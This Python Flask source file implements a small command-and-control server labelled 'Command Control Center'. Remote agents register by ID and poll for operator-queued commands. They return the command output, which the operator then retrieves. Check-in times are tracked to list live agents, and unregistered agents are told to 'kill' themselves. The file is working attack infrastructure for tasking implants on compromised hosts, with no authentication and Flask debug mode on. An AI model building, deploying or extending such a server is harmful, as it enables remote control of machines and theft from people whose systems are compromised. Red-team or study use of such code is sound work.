from flask import Flask, request, jsonify
import argparse
import time


app = Flask(__name__)

# This dictionary will store the commands and their responses.
agent_command_queue = {}
agent_ids = []
alive_agents = []
check_in_time = 3
command_results = {}
last_check_in_time = {}

@app.route('/set_check_in_time', methods=['POST'])
def set_check_in_time():
    data = request.get_json()


    global check_in_time
    check_in_time = data.get('check_in_time')

    return jsonify({'status': 'success'})

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.get_json()

    # Extract the command from the request
    command = data.get('command')
    agentid = data.get('agentid')

    print(f"Command received: {command} for {agentid}")

    agent_command_queue[agentid] = command

    return jsonify({'status': 'success'})

@app.route('/get_task', methods=['GET'])
def get_commands():
    data = request.get_json()
    agentid = data.get('agentid')
    # Check if the agent is registered
    if agentid not in agent_ids:
        return jsonify({'error': 'Agent not registered','command':'kill'})

    last_check_in_time[agentid] = time.time()

    # get command from dictionary pair {'agentid' : 'command'}
    command = agent_command_queue.get(agentid)
    if command is not None:
        #command found then delete
        agent_command_queue[agentid] = None
        return jsonify({'command': command , 'check_in_time': check_in_time})
    else:
        return jsonify({'command': command , 'check_in_time': check_in_time})
    

@app.route('/send_response', methods=['GET'])
def send_response():
    data = request.get_json()
    agentid = data.get('agentid')
    result = data.get('result')

    if agentid not in agent_ids:
        return jsonify({'error': 'Agent not registered'})
    elif result == '':
        return jsonify({'response': 'Received Empty Result'})
    else:
        command_results[agentid] = result
        return jsonify({'result': result,'agentid':agentid})

@app.route('/get_response', methods=['GET'])
def get_response():
    data = request.get_json()
    agentid = data.get('agentid')
    # result = command_results[agentid]
    if command_results == {}:
        return jsonify({'result': "Agent Killed",'agentid':agentid})
    result = command_results[agentid]

    if agentid not in agent_ids:
        return jsonify({'error': 'Agent not registered'})
    else:
        return jsonify({'result': result,'agentid':agentid})

@app.route('/register_agent', methods=['POST'])
def register_agent():
    data = request.get_json()

    # Extract the AGENTID from the request
    agent_id = data.get('agentid')
    if agent_id in agent_ids:
        return jsonify({'status' : 'AgentID Exists'})

    # Store the AGENTID in the set
    agent_ids.append(agent_id)
    alive_agents.append(agent_id)
    print(agent_ids)
    return jsonify({'status': 'success'})


@app.route('/list_agents', methods=['GET'])
def list_agents():
    current_time = time.time()
    active_agents = [
        agent_id
        for agent_id, last_time in last_check_in_time.items()
        if (current_time - last_time) <= (check_in_time * 2)
    ]
    return jsonify({'agents': active_agents})




if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Command Control Center')
    parser.add_argument('--host', default='127.0.0.1', help='Host IP address')
    parser.add_argument('--port', default=5000, type=int, help='Port number')
    
    args = parser.parse_args()

    app.run(debug=True, host=args.host, port=args.port)
